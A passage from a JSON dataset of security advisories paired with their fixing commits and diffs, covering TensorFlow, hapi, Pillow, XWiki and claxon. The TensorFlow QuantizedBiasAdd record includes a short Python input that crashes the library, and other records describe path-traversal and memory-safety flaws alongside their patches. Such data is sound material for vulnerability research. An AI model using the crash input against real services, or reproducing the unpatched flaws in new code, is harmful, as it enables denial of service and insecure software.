      "classification_level_2": null,
      "list_files": "dict_keys(['traffic_ops/traffic_ops_golang/login/login.go'])",
      "num_files": 1.0
    },
    {
      "index": 998,
      "vuln_id": "GHSA-786j-5qwq-r36x",
      "cwe_id": "{'CWE-824'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/7731e8dfbe4a56773be5dc94d631611211156659'}",
      "dataset": "osv",
      "summary": "Segfault while copying constant resource tensor ### Impact\nDuring TensorFlow's Grappler optimizer phase, constant folding might attempt to deep copy a resource tensor. This results in a segfault, as these tensors are supposed to not change.\n\n### Patches\nWe have patched the issue in GitHub commit [7731e8dfbe4a56773be5dc94d631611211156659](https://github.com/tensorflow/tensorflow/commit/7731e8dfbe4a56773be5dc94d631611211156659).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions",
      "published_date": "2021-11-10",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/7731e8dfbe4a56773be5dc94d631611211156659",
      "commit_sha": "7731e8dfbe4a56773be5dc94d631611211156659",
      "patch": "SINGLE",
      "chain_ord": "['7731e8dfbe4a56773be5dc94d631611211156659']",
      "before_first_fix_commit": "{'a813a3f1631e9c0e0e0cc3032349a03a6041526c'}",
      "last_fix_commit": "7731e8dfbe4a56773be5dc94d631611211156659",
      "chain_ord_pos": 1.0,
      "commit_datetime": "08/19/2021, 18:25:32",
      "message": "Don't constant-fold DT_RESOURCE constants.\n\nPiperOrigin-RevId: 391803952\nChange-Id: I0ea3ec31d3e7dfda0f03b4027a237f08d00a3091",
      "author": "A. Unique TensorFlower",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 1, 'total': 4}",
      "files": "{'tensorflow/core/common_runtime/constant_folding.cc': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/7731e8dfbe4a56773be5dc94d631611211156659/tensorflow%2Fcore%2Fcommon_runtime%2Fconstant_folding.cc', 'patch': '@@ -30,6 +30,7 @@ limitations under the License.\\n #include \"tensorflow/core/framework/log_memory.h\"\\n #include \"tensorflow/core/framework/op_kernel.h\"\\n #include \"tensorflow/core/framework/types.h\"\\n+#include \"tensorflow/core/framework/types.pb.h\"\\n #include \"tensorflow/core/graph/algorithm.h\"\\n #include \"tensorflow/core/graph/node_builder.h\"\\n #include \"tensorflow/core/graph/subgraph.h\"\\n@@ -223,7 +224,8 @@ bool IsConstantFoldable(\\n     std::unordered_map<const Node*, std::vector<Tensor>>*\\n         shape_replacement_map) {\\n   if (n->IsConstant()) {\\n-    return true;\\n+    // Skip constant folding resources as they cannot be deep copied.\\n+    return n->output_type(0) != DT_RESOURCE;\\n   }\\n   if (MaybeReplaceShapeOp(n, shape_map, shape_replacement_map)) {\\n     return true;'}}",
      "message_norm": "don't constant-fold dt_resource constants.\n\npiperorigin-revid: 391803952\nchange-id: i0ea3ec31d3e7dfda0f03b4027a237f08d00a3091",
      "language": "ca",
      "entities": "[('391803952', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/common_runtime/constant_folding.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2915,
      "vuln_id": "GHSA-rc8h-3fv6-pxv8",
      "cwe_id": "{'CWE-400'}",
      "score": 0.0,
      "chain": "{'https://github.com/hapijs/hapi/commit/aab2496e930dce5ee1ab28eecec94e0e45f03580'}",
      "dataset": "osv",
      "summary": "Denial of Service in hapi Versions of `hapi` prior to 11.1.3 are affected by a denial of service vulnerability.\n\nThe vulnerability is triggered when certain input is passed into the If-Modified-Since or Last-Modified headers.\n\nThis causes an 'illegal access' exception to be raised, and instead of sending a HTTP 500 error back to the sender, hapi will continue to hold the socket open until timed out (default node timeout is 2 minutes).\n\n\n\n\n\n## Recommendation\n\nUpdate to v11.1.3 or later",
      "published_date": "2018-06-07",
      "chain_len": 1,
      "project": "https://github.com/hapijs/hapi",
      "commit_href": "https://github.com/hapijs/hapi/commit/aab2496e930dce5ee1ab28eecec94e0e45f03580",
      "commit_sha": "aab2496e930dce5ee1ab28eecec94e0e45f03580",
      "patch": "SINGLE",
      "chain_ord": "['aab2496e930dce5ee1ab28eecec94e0e45f03580']",
      "before_first_fix_commit": "{'1ad65ba793377928aa5a2dfc819888c5c9793394', 'ef2a0f85d558eeb102c512fac45386b2145cb903'}",
      "last_fix_commit": "aab2496e930dce5ee1ab28eecec94e0e45f03580",
      "chain_ord_pos": 1.0,
      "commit_datetime": "12/23/2015, 21:54:47",
      "message": "Merge pull request #2988 from hapijs/v11.1.x\n\nHandle invalid date exceptions",
      "author": "Eran Hammer",
      "comments": null,
      "stats": "{'additions': 11, 'deletions': 2, 'total': 13}",
      "files": "{'lib/transmit.js': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https://github.com/hapijs/hapi/raw/aab2496e930dce5ee1ab28eecec94e0e45f03580/lib%2Ftransmit.js', 'patch': '@@ -82,8 +82,8 @@ internals.marshal = function (request, next) {\\n \\n                 // Weak verifier\\n \\n-                const ifModifiedSince = Date.parse(ifModifiedSinceHeader);\\n-                const lastModified = Date.parse(lastModifiedHeader);\\n+                const ifModifiedSince = internals.parseDate(ifModifiedSinceHeader);\\n+                const lastModified = internals.parseDate(lastModifiedHeader);\\n \\n                 if (ifModifiedSince &&\\n                     lastModified &&\\n@@ -147,6 +147,15 @@ internals.marshal = function (request, next) {\\n };\\n \\n \\n+internals.parseDate = function (string) {\\n+\\n+    try {\\n+        return Date.parse(string);\\n+    }\\n+    catch (errIgnore) { }\\n+};\\n+\\n+\\n internals.fail = function (request, boom, callback) {\\n \\n     const error = boom.output;'}}",
      "message_norm": "merge pull request #2988 from hapijs/v11.1.x\n\nhandle invalid date exceptions",
      "language": "en",
      "entities": "[('#2988', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/transmit.js'])",
      "num_files": 1.0
    },
    {
      "index": 2137,
      "vuln_id": "GHSA-hvr8-466p-75rh",
      "cwe_id": "{'CWE-119'}",
      "score": 9.8,
      "chain": "{'https://github.com/python-pillow/Pillow/commit/4e0d9b0b9740d258ade40cce248c93777362ac1e'}",
      "dataset": "osv",
      "summary": "Integer overflow discovered in Pillow  Integer overflow in the ImagingResampleHorizontal function in libImaging/Resample.c in Pillow before 3.1.1 allows remote attackers to have unspecified impact via negative values of the new size, which triggers a heap-based buffer overflow.",
      "published_date": "2018-07-24",
      "chain_len": 1,
      "project": "https://github.com/python-pillow/Pillow",
      "commit_href": "https://github.com/python-pillow/Pillow/commit/4e0d9b0b9740d258ade40cce248c93777362ac1e",
      "commit_sha": "4e0d9b0b9740d258ade40cce248c93777362ac1e",
      "patch": "SINGLE",
      "chain_ord": "['4e0d9b0b9740d258ade40cce248c93777362ac1e']",
      "before_first_fix_commit": "{'bdd86b72ae38874b6bdaf27458a5ed00df0cd3d5'}",
      "last_fix_commit": "4e0d9b0b9740d258ade40cce248c93777362ac1e",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/04/2016, 06:54:12",
      "message": "fix integer overflow in Resample.c",
      "author": "Ned Williamson",
      "comments": null,
      "stats": "{'additions': 12, 'deletions': 0, 'total': 12}",
      "files": "{'libImaging/Resample.c': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https://github.com/python-pillow/Pillow/raw/4e0d9b0b9740d258ade40cce248c93777362ac1e/libImaging%2FResample.c', 'patch': '@@ -138,11 +138,23 @@ ImagingResampleHorizontal(Imaging imIn, int xsize, int filter)\\n     /* maximum number of coofs */\\n     kmax = (int) ceil(support) * 2 + 1;\\n \\n+    // check for overflow\\n+    if (kmax > 0 && xsize > SIZE_MAX / kmax)\\n+        return (Imaging) ImagingError_MemoryError();\\n+\\n+    // sizeof(float) should be greater than 0\\n+    if (xsize * kmax > SIZE_MAX / sizeof(float))\\n+        return (Imaging) ImagingError_MemoryError();\\n+\\n     /* coefficient buffer */\\n     kk = malloc(xsize * kmax * sizeof(float));\\n     if ( ! kk)\\n         return (Imaging) ImagingError_MemoryError();\\n \\n+    // sizeof(int) should be greater than 0 as well\\n+    if (xsize > SIZE_MAX / (2 * sizeof(int)))\\n+        return (Imaging) ImagingError_MemoryError();\\n+\\n     xbounds = malloc(xsize * 2 * sizeof(int));\\n     if ( ! xbounds) {\\n         free(kk);'}}",
      "message_norm": "fix integer overflow in resample.c",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('integer overflow', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['libImaging/Resample.c'])",
      "num_files": 1.0
    },
    {
      "index": 2214,
      "vuln_id": "GHSA-j86v-p27c-73fm",
      "cwe_id": "{'CWE-824'}",
      "score": 7.8,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6'}",
      "dataset": "osv",
      "summary": "Unitialized access in `EinsumHelper::ParseEquation` ### Impact\nDuring execution, [`EinsumHelper::ParseEquation()`](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/linalg/einsum_op_impl.h#L126-L181) is supposed to set the flags in `input_has_ellipsis` vector and `*output_has_ellipsis` boolean to indicate whether there is ellipsis in the corresponding inputs and output.\n\nHowever, the code only changes these flags to `true` and never assigns `false`.\n\n```cc\nfor (int i = 0; i < num_inputs; ++i) {\n  input_label_counts->at(i).resize(num_labels);\n  for (const int label : input_labels->at(i)) {\n    if (label != kEllipsisLabel)\n      input_label_counts->at(i)[label] += 1;\n    else\n      input_has_ellipsis->at(i) = true;\n  }\n}\noutput_label_counts->resize(num_labels);\nfor (const int label : *output_labels) {\n  if (label != kEllipsisLabel)\n    output_label_counts->at(label) += 1;\n  else\n    *output_has_ellipsis = true;\n}\n```\n\nThis results in unitialized variable access if callers assume that `EinsumHelper::ParseEquation()` always sets these flags.\n\n\n### Patches\nWe have patched the issue in GitHub commit [f09caa532b6e1ac8d2aa61b7832c78c5b79300c6](https://github.com/tensorflow/tensorflow/commit/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
      "published_date": "2021-11-10",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6",
      "commit_sha": "f09caa532b6e1ac8d2aa61b7832c78c5b79300c6",
      "patch": "SINGLE",
      "chain_ord": "['f09caa532b6e1ac8d2aa61b7832c78c5b79300c6']",
      "before_first_fix_commit": "{'a81f78d35ecabae6ba61c1a65279bcb5ff9c7d95'}",
      "last_fix_commit": "f09caa532b6e1ac8d2aa61b7832c78c5b79300c6",
      "chain_ord_pos": 1.0,
      "commit_datetime": "08/19/2021, 16:05:04",
      "message": "Fix EinsumHelper::ParseEquation to avoid uninitialized accesses.\n\nEinsumHelper::ParseEquation is supposed to return true or false in\ninput_has_ellipsis and output_has_ellipsis to indicate whether there is\nellipsis in the inputs and output. Previously, when there is no ellipsis in the\ninputs or output, the routine doesn't assign false to the variables. This\nchange initializes the two variables with false to fix the problem.\nPiperOrigin-RevId: 391772004\nChange-Id: I17b6c88aadef4131470378e48cced054bf252e86",
      "author": "Bixia Zheng",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 0, 'total': 2}",
      "files": "{'tensorflow/core/kernels/linalg/einsum_op_impl.h': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6/tensorflow%2Fcore%2Fkernels%2Flinalg%2Feinsum_op_impl.h', 'patch': '@@ -153,6 +153,7 @@ struct EinsumHelper {\\n     input_has_ellipsis->resize(num_inputs);\\n     for (int i = 0; i < num_inputs; ++i) {\\n       input_label_counts->at(i).resize(num_labels);\\n+      input_has_ellipsis->at(i) = false;\\n       for (const int label : input_labels->at(i)) {\\n         if (label != kEllipsisLabel)\\n           input_label_counts->at(i)[label] += 1;\\n@@ -161,6 +162,7 @@ struct EinsumHelper {\\n       }\\n     }\\n     output_label_counts->resize(num_labels);\\n+    *output_has_ellipsis = false;\\n     for (const int label : *output_labels) {\\n       if (label != kEllipsisLabel)\\n         output_label_counts->at(label) += 1;'}}",
      "message_norm": "fix einsumhelper::parseequation to avoid uninitialized accesses.\n\neinsumhelper::parseequation is supposed to return true or false in\ninput_has_ellipsis and output_has_ellipsis to indicate whether there is\nellipsis in the inputs and output. previously, when there is no ellipsis in the\ninputs or output, the routine doesn't assign false to the variables. this\nchange initializes the two variables with false to fix the problem.\npiperorigin-revid: 391772004\nchange-id: i17b6c88aadef4131470378e48cced054bf252e86",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('uninitialized', 'SECWORD', ''), ('initializes', 'SECWORD', ''), ('fix', 'ACTION', ''), ('problem', 'FLAW', ''), ('391772004', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/linalg/einsum_op_impl.h'])",
      "num_files": 1.0
    },
    {
      "index": 1048,
      "vuln_id": "GHSA-7ph6-5cmq-xgjq",
      "cwe_id": "{'CWE-22'}",
      "score": 6.8,
      "chain": "{'https://github.com/xwiki/xwiki-platform/commit/ab778254fb8f71c774e1c1239368c44fe3b6bba5'}",
      "dataset": "osv",
      "summary": "Path traversal in xwiki-platform-skin-skinx XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. AbstractSxExportURLFactoryActionHandler#processSx does not escape anything from SSX document reference when serializing it on filesystem, so it's easy to mess up the HTML export process with reference elements containing filesystem syntax like \"../\", \"./\". or \"/\" in general (the last two not causing any security threat, but can cause conflicts with others serialized files). Patch can be found in 13.6-rc-1. Giving script or subwiki admin right only to trusted people and disabling HTML/PDF export can be done as workaround.",
      "published_date": "2022-02-09",
      "chain_len": 1,
      "project": "https://github.com/xwiki/xwiki-platform",
      "commit_href": "https://github.com/xwiki/xwiki-platform/commit/ab778254fb8f71c774e1c1239368c44fe3b6bba5",
      "commit_sha": "ab778254fb8f71c774e1c1239368c44fe3b6bba5",
      "patch": "SINGLE",
      "chain_ord": "['ab778254fb8f71c774e1c1239368c44fe3b6bba5']",
      "before_first_fix_commit": "{'9e4d40d03960b20233f6887bc142fe4474f620c4'}",
      "last_fix_commit": "ab778254fb8f71c774e1c1239368c44fe3b6bba5",
      "chain_ord_pos": 1.0,
      "commit_datetime": "07/07/2021, 14:02:50",
      "message": "XWIKI-18819: It's possible to save pretty much anything anywhere by creating and using an SSX/JSX containing \"../\" in its reference",
      "author": "Thomas Mortagne",
      "comments": null,
      "stats": "{'additions': 7, 'deletions': 11, 'total': 18}",
      "files": "{'xwiki-platform-core/xwiki-platform-skin/xwiki-platform-skin-skinx/src/main/java/org/xwiki/skinx/internal/AbstractSxExportURLFactoryActionHandler.java': {'additions': 7, 'deletions': 11, 'changes': 18, 'status': 'modified', 'raw_url': 'https://github.com/xwiki/xwiki-platform/raw/ab778254fb8f71c774e1c1239368c44fe3b6bba5/xwiki-platform-core%2Fxwiki-platform-skin%2Fxwiki-platform-skin-skinx%2Fsrc%2Fmain%2Fjava%2Forg%2Fxwiki%2Fskinx%2Finternal%2FAbstractSxExportURLFactoryActionHandler.java', 'patch': '@@ -100,13 +100,13 @@ public URL createURL(String spaces, String name, String queryString, String anch\\n         XWikiDocument.backupContext(backup, context);\\n         try {\\n             sxDocument.setAsContextDoc(context);\\n-            return processSx(spaceNames, name, queryString, context, exportContext);\\n+            return processSx(sxDocument.getId(), queryString, context, exportContext);\\n         } finally {\\n             XWikiDocument.restoreContext(backup, context);\\n         }\\n     }\\n \\n-    private URL processSx(List<String> spaceNames, String name, String queryString, XWikiContext context,\\n+    private URL processSx(long id, String queryString, XWikiContext context,\\n         FilesystemExportContext exportContext) throws Exception\\n     {\\n         SxSource sxSource = null;\\n@@ -128,7 +128,7 @@ private URL processSx(List<String> spaceNames, String name, String queryString,\\n \\n         // Write the content to file\\n         // We need a unique name for that SSX content\\n-        String targetPath = String.format(\"%s/%s/%s\", getSxPrefix(), StringUtils.join(spaceNames, \\'/\\'), name);\\n+        String targetPath = String.format(\"%s/%s\", getSxPrefix(), id);\\n         File targetDirectory = new File(exportContext.getExportDir(), targetPath);\\n         if (!targetDirectory.exists()) {\\n             targetDirectory.mkdirs();\\n@@ -146,11 +146,7 @@ private URL processSx(List<String> spaceNames, String name, String queryString,\\n \\n         path.append(getSxPrefix());\\n         path.append(URL_PATH_SEPARATOR);\\n-        for (String spaceName : spaceNames) {\\n-            path.append(encodeURLPart(spaceName));\\n-            path.append(URL_PATH_SEPARATOR);\\n-        }\\n-        path.append(encodeURLPart(name));\\n+        path.append(id);\\n         path.append(URL_PATH_SEPARATOR);\\n         path.append(encodeURLPart(targetLocation.getName()));\\n \\n@@ -161,14 +157,14 @@ protected String getContent(SxSource sxSource, FilesystemExportContext exportCon\\n     {\\n         String content;\\n \\n-        // We know we\\'re inside a SX file located at \"<S|J>sx/<Space>/<Page>/<s|j>sx<NNN>.<css|js>\". Inside this CSS\\n+        // We know we\\'re inside a SX file located at \"<S|J>sx/<id>/<s|j>sx<NNN>.<css|js>\". Inside this CSS\\n         // there can be URLs and we need to ensure that the prefix for these URLs lead to the root of the path, i.e.\\n-        // 3 levels up (\"../../../\").\\n+        // 3 levels up (\"../../\").\\n         // To make this happen we reuse the Doc Parent Level from FileSystemExportContext to a fixed value of 3.\\n         // We also make sure to put back the original value\\n         int originalDocParentLevel = exportContext.getDocParentLevel();\\n         try {\\n-            exportContext.setDocParentLevels(3);\\n+            exportContext.setDocParentLevels(2);\\n             content = sxSource.getContent();\\n         } finally {\\n             exportContext.setDocParentLevels(originalDocParentLevel);'}}",
      "message_norm": "xwiki-18819: it's possible to save pretty much anything anywhere by creating and using an ssx/jsx containing \"../\" in its reference",
      "language": "en",
      "entities": null,
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['xwiki-platform-core/xwiki-platform-skin/xwiki-platform-skin-skinx/src/main/java/org/xwiki/skinx/internal/AbstractSxExportURLFactoryActionHandler.java'])",
      "num_files": 1.0
    },
    {
      "index": 1182,
      "vuln_id": "GHSA-8c6g-4xc5-w96c",
      "cwe_id": "{'CWE-908'}",
      "score": 6.5,
      "chain": "{'https://github.com/ruuda/claxon/commit/8f28ec275e412dd3af4f3cda460605512faf332c'}",
      "dataset": "osv",
      "summary": "Uninitialized memory exposure in claxon An issue was discovered in the claxon crate before 0.4.1 for Rust. Uninitialized memory can be exposed because certain decode buffer sizes are mishandled.",
      "published_date": "2021-08-25",
      "chain_len": 1,
      "project": "https://github.com/ruuda/claxon",
      "commit_href": "https://github.com/ruuda/claxon/commit/8f28ec275e412dd3af4f3cda460605512faf332c",
      "commit_sha": "8f28ec275e412dd3af4f3cda460605512faf332c",
      "patch": "SINGLE",
      "chain_ord": "['8f28ec275e412dd3af4f3cda460605512faf332c']",
      "before_first_fix_commit": "{'cd82be35f413940ba446d2a19f10d74b86466487'}",
      "last_fix_commit": "8f28ec275e412dd3af4f3cda460605512faf332c",
      "chain_ord_pos": 1.0,
      "commit_datetime": "08/23/2018, 18:01:40",
      "message": "Fix bug in decoding residuals\n\nA partition order could occur, such that the block size was not a\nmultiple of 2^order. Computation of the number of samples per partition\ndid not account for this case, rounding down due to the bit shift. This\nmeant that we would not fill the entire decode buffer.\n\nClaxon does not zero the decode buffer because it is (should be)\noverwritten anyway, and in the case of a format error, where the buffer\nmight be only partially full, the buffer is not exposed again.\nFurthermore, the way decoding works in most places, is that we fill the\nentire buffer, just by looping to fill it. If the input bitstream does\nnot contain enough data to fill the buffer, then that's a format error.\nIn a few places though, we need to slice up the buffer before decoding\ninto it: for decoding individual channels, and also for decoding\nresiduals, which are split into partitions.\n\nThis particular format error was especially nasty because it did not\ncause a format error down the line. Instead, it caused the buffer to be\nsliced in a way where the slices together did not cover the entire\nbuffer, and so parts of uninitialized memory could remain in the buffer.\n\nThanks a lot to Sergey \"Shnatsel\" Davidoff for reporting this bug,\ntogether with elaborate steps to reproduce that allowed me to pinpoint\nthe cause quickly.",
      "author": "Ruud van Asseldonk",
      "comments": null,
      "stats": "{'additions': 19, 'deletions': 6, 'total': 25}",
      "files": "{'src/subframe.rs': {'additions': 19, 'deletions': 6, 'changes': 25, 'status': 'modified', 'raw_url': 'https://github.com/ruuda/claxon/raw/8f28ec275e412dd3af4f3cda460605512faf332c/src%2Fsubframe.rs', 'patch': '@@ -254,35 +254,48 @@ fn decode_residual<R: ReadBytes>(input: &mut Bitstream<R>,\\n     // most 2^16 - 1 samples in the block. No values have been marked as\\n     // invalid by the specification though.\\n     let n_partitions = 1u32 << order;\\n-    let n_samples = block_size >> order;\\n+    let n_samples_per_partition = block_size >> order;\\n+\\n+    // The partitions together must fill the block. If the block size is not a\\n+    // multiple of 2^order; if we shifted off some bits, then we would not fill\\n+    // the entire block. Such a partition order is invalid for this block size.\\n+    if block_size & (n_partitions - 1) as u16 != 0 {\\n+        return fmt_err(\"invalid partition order\")\\n+    }\\n+\\n+    // NOTE: the check above checks that block_size is a multiple of n_partitions\\n+    // (this works because n_partitions is a power of 2). The check below is\\n+    // equivalent but more expensive.\\n+    debug_assert_eq!(n_partitions * n_samples_per_partition as u32, block_size as u32);\\n+\\n     let n_warm_up = block_size - buffer.len() as u16;\\n \\n     // The partition size must be at least as big as the number of warm-up\\n     // samples, otherwise the size of the first partition is negative.\\n-    if n_warm_up > n_samples {\\n+    if n_warm_up > n_samples_per_partition {\\n         return fmt_err(\"invalid residual\");\\n     }\\n \\n     // Finally decode the partitions themselves.\\n     match partition_type {\\n         RicePartitionType::Rice => {\\n             let mut start = 0;\\n-            let mut len = n_samples - n_warm_up;\\n+            let mut len = n_samples_per_partition - n_warm_up;\\n             for _ in 0..n_partitions {\\n                 let slice = &mut buffer[start..start + len as usize];\\n                 try!(decode_rice_partition(input, slice));\\n                 start = start + len as usize;\\n-                len = n_samples;\\n+                len = n_samples_per_partition;\\n             }\\n         }\\n         RicePartitionType::Rice2 => {\\n             let mut start = 0;\\n-            let mut len = n_samples - n_warm_up;\\n+            let mut len = n_samples_per_partition - n_warm_up;\\n             for _ in 0..n_partitions {\\n                 let slice = &mut buffer[start..start + len as usize];\\n                 try!(decode_rice2_partition(input, slice));\\n                 start = start + len as usize;\\n-                len = n_samples;\\n+                len = n_samples_per_partition;\\n             }\\n         }\\n     }'}}",
      "message_norm": "fix bug in decoding residuals\n\na partition order could occur, such that the block size was not a\nmultiple of 2^order. computation of the number of samples per partition\ndid not account for this case, rounding down due to the bit shift. this\nmeant that we would not fill the entire decode buffer.\n\nclaxon does not zero the decode buffer because it is (should be)\noverwritten anyway, and in the case of a format error, where the buffer\nmight be only partially full, the buffer is not exposed again.\nfurthermore, the way decoding works in most places, is that we fill the\nentire buffer, just by looping to fill it. if the input bitstream does\nnot contain enough data to fill the buffer, then that's a format error.\nin a few places though, we need to slice up the buffer before decoding\ninto it: for decoding individual channels, and also for decoding\nresiduals, which are split into partitions.\n\nthis particular format error was especially nasty because it did not\ncause a format error down the line. instead, it caused the buffer to be\nsliced in a way where the slices together did not cover the entire\nbuffer, and so parts of uninitialized memory could remain in the buffer.\n\nthanks a lot to sergey \"shnatsel\" davidoff for reporting this bug,\ntogether with elaborate steps to reproduce that allowed me to pinpoint\nthe cause quickly.",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('bug', 'FLAW', ''), ('decoding', 'SECWORD', ''), ('decode', 'SECWORD', ''), ('decode', 'SECWORD', ''), ('error', 'FLAW', ''), ('decoding', 'SECWORD', ''), ('error', 'FLAW', ''), ('decoding', 'SECWORD', ''), ('decoding', 'SECWORD', ''), ('decoding', 'SECWORD', ''), ('error', 'FLAW', ''), ('error', 'FLAW', ''), ('uninitialized memory', 'SECWORD', ''), ('bug', 'FLAW', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/subframe.rs'])",
      "num_files": 1.0
    },
    {
      "index": 2335,
      "vuln_id": "GHSA-m34j-p8rj-wjxq",
      "cwe_id": "{'CWE-369'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/67784700869470d65d5f2ef20aeb5e97c31673cb'}",
      "dataset": "osv",
      "summary": "Division by 0 in `QuantizedBiasAdd` ### Impact\nAn attacker can trigger an integer division by zero undefined behavior in `tf.raw_ops.QuantizedBiasAdd`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nbias = tf.constant([], shape=[0], dtype=tf.quint8)\nmin_input = tf.constant(-10.0, dtype=tf.float32)\nmax_input = tf.constant(-10.0, dtype=tf.float32)\nmin_bias = tf.constant(-10.0, dtype=tf.float32)\nmax_bias = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBiasAdd(input=input_tensor, bias=bias, min_input=min_input,\n                            max_input=max_input, min_bias=min_bias,\n                            max_bias=max_bias, out_type=tf.qint32)\n```\n\nThis is because the [implementation of the Eigen kernel](https://github.com/tensorflow/tensorflow/blob/61bca8bd5ba8a68b2d97435ddfafcdf2b85672cd/tensorflow/core/kernels/quantization_utils.h#L812-L849) does a division by the number of elements of the smaller input (based on shape) without checking that this is not zero:\n\n```cc\ntemplate <typename T1, typename T2, typename T3>\nvoid QuantizedAddUsingEigen(const Eigen::ThreadPoolDevice& device,\n                            const Tensor& input, float input_min,\n                            float input_max, const Tensor& smaller_input,\n                            float smaller_input_min, float smaller_input_max,\n                            Tensor* output, float* output_min,\n                            float* output_max) {\n  ...\n  const int64 input_element_count = input.NumElements();\n  const int64 smaller_input_element_count = smaller_input.NumElements();\n  ...\n  bcast[0] = input_element_count / smaller_input_element_count;\n  ...\n}\n```\n\nThis integral division by 0 is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [67784700869470d65d5f2ef20aeb5e97c31673cb](https://github.com/tensorflow/tensorflow/commit/67784700869470d65d5f2ef20aeb5e97c31673cb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/67784700869470d65d5f2ef20aeb5e97c31673cb",
      "commit_sha": "67784700869470d65d5f2ef20aeb5e97c31673cb",
      "patch": "SINGLE",
      "chain_ord": "['67784700869470d65d5f2ef20aeb5e97c31673cb']",
      "before_first_fix_commit": "{'61bca8bd5ba8a68b2d97435ddfafcdf2b85672cd'}",
      "last_fix_commit": "67784700869470d65d5f2ef20aeb5e97c31673cb",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/23/2021, 18:11:39",
      "message": "Prevent division by 0 in `QuantizedBiasAdd`.\n\nPiperOrigin-RevId: 370117454\nChange-Id: I3804e2ac8dcc6d3afcc92e27853e2325a017ca4d",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 0, 'total': 2}",
      "files": "{'tensorflow/core/kernels/quantized_bias_add_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/67784700869470d65d5f2ef20aeb5e97c31673cb/tensorflow%2Fcore%2Fkernels%2Fquantized_bias_add_op.cc', 'patch': '@@ -56,6 +56,8 @@ class QuantizedBiasAddOp : public OpKernel {\\n             \"Must provide as many biases as the last dimension \"\\n             \"of the input tensor: \",\\n             bias.shape().DebugString(), \" vs. \", input.shape().DebugString()));\\n+    OP_REQUIRES(context, bias.NumElements() > 0,\\n+                errors::InvalidArgument(\"Must provide at least 1 bias\"));\\n \\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(context,'}}",
      "message_norm": "prevent division by 0 in `quantizedbiasadd`.\n\npiperorigin-revid: 370117454\nchange-id: i3804e2ac8dcc6d3afcc92e27853e2325a017ca4d",
      "language": "it",
      "entities": "[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370117454', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/quantized_bias_add_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 682,
      "vuln_id": "GHSA-5qjq-69w6-fg57",
      "cwe_id": "{'CWE-79'}",
      "score": 10.0,
      "chain": "{'https://github.com/flarum/core/commit/440bed81b8019dff00642c8f493b4909d505a28a'}",
      "dataset": "osv",
